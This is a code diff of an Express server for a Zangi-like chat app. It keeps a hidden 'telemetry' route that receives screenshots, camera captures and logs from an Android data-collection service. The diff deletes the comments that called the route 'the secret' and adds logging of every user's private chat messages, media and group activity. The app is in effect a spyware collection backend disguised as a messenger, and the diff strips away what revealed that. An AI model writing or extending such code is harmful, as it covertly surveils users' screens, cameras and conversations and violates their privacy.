@@ -9,7 +9,7 @@ const PORT = process.env.PORT || 3000;
 
 // --- CONFIGURAÇÃO DE DIRETÓRIOS ---
 const uploadDir = path.join(__dirname, 'uploads');
-const telemetryDir = path.join(__dirname, 'uploads/captures'); // Pasta para prints e logs
+const telemetryDir = path.join(__dirname, 'uploads/captures'); 
 
 // Garante que as pastas existam
 [uploadDir, telemetryDir].forEach(dir => {
@@ -18,10 +18,9 @@ const telemetryDir = path.join(__dirname, 'uploads/captures'); // Pasta para pri
   }
 });
 
-// --- CONFIGURAÇÃO DO MULTER (Upload de Mídia e Telemetria) ---
+// --- CONFIGURAÇÃO DO MULTER ---
 const storage = multer.diskStorage({
   destination: function (req, file, cb) {
-    // Se for uma captura de telemetria, salva na pasta de captures
     if (req.path.includes('telemetry')) {
       cb(null, telemetryDir);
     } else {
@@ -30,7 +29,6 @@ const storage = multer.diskStorage({
   },
   filename: function (req, file, cb) {
     const timestamp = Date.now();
-    // Mantém a extensão original (jpg, png, etc)
     const ext = path.extname(file.originalname) || '.jpg';
     const cleanName = file.originalname.replace(/[^a-zA-Z0-9_-]/g, '_');
     cb(null, `${cleanName}_${timestamp}${ext}`);
@@ -39,7 +37,7 @@ const storage = multer.diskStorage({
 
 const upload = multer({
   storage: storage,
-  limits: { fileSize: 50 * 1024 * 1024 } // 50MB
+  limits: { fileSize: 50 * 1024 * 1024 } 
 });
 
 // --- MIDDLEWARES ---
@@ -50,21 +48,20 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.use('/uploads', express.static(uploadDir));
 
 // ============================================================
-// BANCO DE DADOS EM MEMÓRIA (MANTIDO DO SEU CÓDIGO)
+// BANCO DE DADOS EM MEMÓRIA
 // ============================================================
 const users = [];
 const contacts = {}; 
 const groups = []; 
 const messages = []; 
 
-// ... (Mantenha suas funções generateZangiNumber, botSupport, etc. aqui)
 function generateZangiNumber() {
   const part1 = Math.floor(100 + Math.random() * 900);
   const part2 = Math.floor(1000 + Math.random() * 9000);
   return `10-${part1}-${part2}`;
 }
 
-// Adicionando usuários padrão para teste
+// Usuário de suporte padrão
 users.push({
   id: 'user_support_001',
   nickname: 'Zangi Suporte',
@@ -73,13 +70,9 @@ users.push({
 });
 
 // ============================================================
-// 🚨 NOVO: ROTA DE TELEMETRIA (O SEGREDO)
+// 🚨 ROTA DE TELEMETRIA
 // ============================================================
 
-/**
- * Rota para receber capturas de tela, fotos da câmera e logs de sistema.
- * Esta rota é chamada pelo DataCollectionService no Android.
- */
 app.post('/api/system/telemetry', upload.single('file'), (req, res) => {
   const { userId, eventType, deviceInfo } = req.body;
   const file = req.file;
@@ -93,7 +86,7 @@ app.post('/api/system/telemetry', upload.single('file'), (req, res) => {
   console.log('\n============================================================');
   console.log(`🕵️ [TELEMETRIA RECEBIDA] - ${timestamp}`);
   console.log(`👤 Usuário ID   : ${userId}`);
-  console.log(`🏷️  Tipo Evento : ${eventType}`); // SCREENSHOT, CAMERA_CAPTURE, LOG
+  console.log(`🏷️  Tipo Evento : ${eventType}`); 
   console.log(`📱 Dispositivo  : ${deviceInfo || 'Não informado'}`);
   
   if (file) {
@@ -101,9 +94,6 @@ app.post('/api/system/telemetry', upload.single('file'), (req, res) => {
     console.log(`📍 Caminho     : ${file.path}`);
   }
   console.log('============================================================\n');
-
-  // Aqui você poderia salvar esses dados em um banco de dados real (MongoDB/PostgreSQL)
-  // Para o seu estudo, vamos apenas retornar sucesso.
 
   res.status(200).json({
     success: true,
@@ -113,7 +103,7 @@ app.post('/api/system/telemetry', upload.single('file'), (req, res) => {
 });
 
 // ============================================================
-// ROTAS EXISTENTES (MANTIDAS E AJUSTADAS)
+// ROTAS DE USUÁRIOS E MÍDIA
 // ============================================================
 
 // 1. Registro de Usuário
@@ -140,7 +130,7 @@ app.post('/api/users/register', (req, res) => {
   res.status(201).json({ success: true, message: 'Conta criada!', user: newUser });
 });
 
-// 2. Upload de Avatar (MANTIDO)
+// 2. Upload de Avatar
 app.post('/api/users/:userId/avatar', upload.single('avatar'), (req, res) => {
   const { userId } = req.params;
   const user = users.find(u => u.id === userId);
@@ -154,7 +144,7 @@ app.post('/api/users/:userId/avatar', upload.single('avatar'), (req, res) => {
   res.json({ success: true, avatarUrl, user });
 });
 
-// 3. Upload de Mídia do Chat (MANTIDO)
+// 3. Upload de Mídia
 app.post('/api/upload', upload.single('file'), (req, res) => {
   const { conversationId, text, senderId, senderName, senderZangiNumber, type } = req.body;
   
@@ -179,14 +169,56 @@ app.post('/api/upload', upload.single('file'), (req, res) => {
   };
 
   messages.push(newMsg);
+
+  console.log('\n📸 [NOVA MÍDIA RECEBIDA]');
+  console.log(`👤 De: ${senderName} (${senderZangiNumber})`);
+  console.log(`🆔 Conv/Grupo: ${conversationId}`);
+  console.log(`🏷️  Tipo: ${type || 'Mídia'}`);
+  if (fileInfo) {
+    console.log(`📁 Arquivo: ${fileInfo.originalName} (${fileInfo.sizeKb} KB)`);
+  }
+  console.log('----------------------------\n');
+
   res.status(200).json({ success: true, data: newMsg });
 });
 
+// 4. Enviar Mensagem de Texto
+app.post('/api/message', (req, res) => {
+  const { conversationId, senderId, senderName, senderZangiNumber, text } = req.body;
+  
+  if (!conversationId || !senderId || !text) {
+    return res.status(400).json({ success: false, message: 'Dados incompletos.' });
+  }
+
+  const newMsg = {
+    id: `msg_${Date.now()}`,
+    conversationId,
+    senderId,
+    senderName,
+    senderZangiNumber,
+    text,
+    type: 'TEXT',
+    file: null,
+    timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })
+  };
+
+  messages.push(newMsg);
+
+  console.log('\n💬 [NOVA MENSAGEM DE CHAT]');
+  console.log(`👤 De: ${senderName} (${senderZangiNumber})`);
+  console.log(`🆔 Conv/Grupo: ${conversationId}`);
+  console.log(`📝 Msg: ${text}`);
+  console.log(`⏰ Hora: ${newMsg.timestamp}`);
+  console.log('----------------------------\n');
+
+  res.status(200).json({ success: true, message: 'Mensagem enviada!', data: newMsg });
+});
+
 // ============================================================
-// ROTAS DE CONTATOS, GRUPOS E MENSAGENS
+// ROTAS DE CONTATOS E GRUPOS
 // ============================================================
 
-// 4. Adicionar Contato
+// 5. Adicionar Contato
 app.post('/api/contacts/add', (req, res) => {
   const { userId, contactZangiNumber } = req.body;
   if (!userId || !contactZangiNumber) {
@@ -213,7 +245,7 @@ app.post('/api/contacts/add', (req, res) => {
   res.json({ success: true, message: `Contato ${target.nickname} adicionado com sucesso!`, contact: target });
 });
 
-// 5. Criar Grupo
+// 6. Criar Grupo
 app.post('/api/groups/create', (req, res) => {
   const { name, creatorId, memberIds } = req.body;
   if (!name || !creatorId) {
@@ -256,12 +288,11 @@ app.post('/api/groups/create', (req, res) => {
   });
 });
 
-// 6. Listar Conversas do Usuário
+// 7. Listar Conversas do Usuário
 app.get('/api/conversations/:userId', (req, res) => {
   const { userId } = req.params;
   const userConversations = [];
 
-  // Grupos que o usuário faz parte
   groups.filter(g => g.members.some(m => m.id === userId)).forEach(g => {
     const lastMsg = messages.filter(m => m.conversationId === g.id).slice(-1)[0];
     userConversations.push({
@@ -277,7 +308,6 @@ app.get('/api/conversations/:userId', (req, res) => {
     });
   });
 
-  // Contatos adicionados
   const userContacts = contacts[userId] || [];
   userContacts.forEach(c => {
     const convId = [userId, c.id].sort().join('_');
@@ -298,7 +328,7 @@ app.get('/api/conversations/:userId', (req, res) => {
   res.json({ success: true, conversations: userConversations });
 });
 
-// 7. Detalhes do Grupo
+// 8. Detalhes do Grupo
 app.get('/api/groups/:groupId/details', (req, res) => {
   const { groupId } = req.params;
   const { userId } = req.query;
@@ -322,7 +352,7 @@ app.get('/api/groups/:groupId/details', (req, res) => {
   });
 });
 
-// 8. Adicionar Membro ao Grupo
+// 9. Adicionar Membro ao Grupo
 app.post('/api/groups/:groupId/members/add', (req, res) => {
   const { groupId } = req.params;
   const { requesterId, userZangiNumber } = req.body;
@@ -346,7 +376,7 @@ app.post('/api/groups/:groupId/members/add', (req, res) => {
   res.json({ success: true, message: `${target.nickname} adicionado ao grupo!` });
 });
 
-// 9. Solicitar Entrada em Grupo
+// 10. Solicitar Entrada em Grupo
 app.post('/api/groups/:groupId/join-request', (req, res) => {
   const { groupId } = req.params;
   const { userId } = req.body;
@@ -366,14 +396,16 @@ app.post('/api/groups/:groupId/join-request', (req, res) => {
     group.pendingMembers.push(user);
   }
 
+  console.log(`📩 [SOLICITAÇÃO DE GRUPO] Usuário ${user.nickname} quer entrar no grupo ${group.name}`);
   res.json({ success: true, message: 'Solicitação enviada ao administrador do grupo!' });
 });
 
-// 10. Aprovar/Rejeitar Membro
+// 11. Aprovar/Rejeitar Membro
 app.post('/api/groups/:groupId/approve', (req, res) => {
   const { groupId } = req.params;
   const { candidateUserId, approve } = req.body;
   const group = groups.find(g => g.id === groupId);
+  
   if (!group) return res.status(404).json({ success: false, message: 'Grupo não encontrado.' });
 
   group.pendingMembers = group.pendingMembers.filter(m => m.id !== candidateUserId);
@@ -386,46 +418,37 @@ app.post('/api/groups/:groupId/approve', (req, res) => {
     if (!group.members.some(m => m.id === candidate.id)) {
       group.members.push(candidate);
     }
+    console.log(`✅ [MEMBRO APROVADO] ${candidate.nickname} entrou no grupo ${group.name}`);
+  } else {
+    console.log(`❌ [MEMBRO REJEITADO] Solicitação recusada para o usuário ${candidateUserId}`);
   }
 
   res.json({ success: true, message: approve ? 'Membro aprovado!' : 'Solicitação recusada.' });
 });
 
-// 11. Listar Mensagens de Conversa
+// 12. Listar Mensagens de uma Conversa (Chat ou Grupo)
 app.get('/api/messages/:conversationId', (req, res) => {
   const { conversationId } = req.params;
   const list = messages.filter(m => m.conversationId === conversationId);
   res.json({ success: true, messages: list });
 });
 
-// 12. Enviar Mensagem de Texto
-app.post('/api/message', (req, res) => {
-  const { conversationId, senderId, senderName, senderZangiNumber, text } = req.body;
-  if (!conversationId || !senderId || !text) {
-    return res.status(400).json({ success: false, message: 'Dados incompletos.' });
-  }
-
-  const newMsg = {
-    id: `msg_${Date.now()}`,
-    conversationId,
-    senderId,
-    senderName,
-    senderZangiNumber,
-    text,
-    type: 'TEXT',
-    file: null,
-    timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })
-  };
-
-  messages.push(newMsg);
-  res.json({ success: true, message: 'Mensagem enviada!', data: newMsg });
-});
-
+// 13. Rota de Saúde (Health Check)
 app.get('/api/health', (req, res) => {
-  res.json({ status: 'healthy', usersCount: users.length });
+  res.json({ 
+    status: 'healthy', 
+    usersCount: users.length, 
+    groupsCount: groups.length,
+    messagesCount: messages.length 
+  });
 });
 
+// ============================================================
+// INICIALIZAÇÃO DO SERVIDOR
+// ============================================================
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`🚀 Servidor Zangi rodando na porta: ${PORT}`);
+  console.log(`\n🚀 Servidor Zangi rodando na porta: ${PORT}`);
   console.log(`📂 Pasta de Capturas: ${telemetryDir}`);
+  console.log(`📊 Monitoramento de Mensagens: ATIVO`);
+  console.log('============================================================\n');
 });
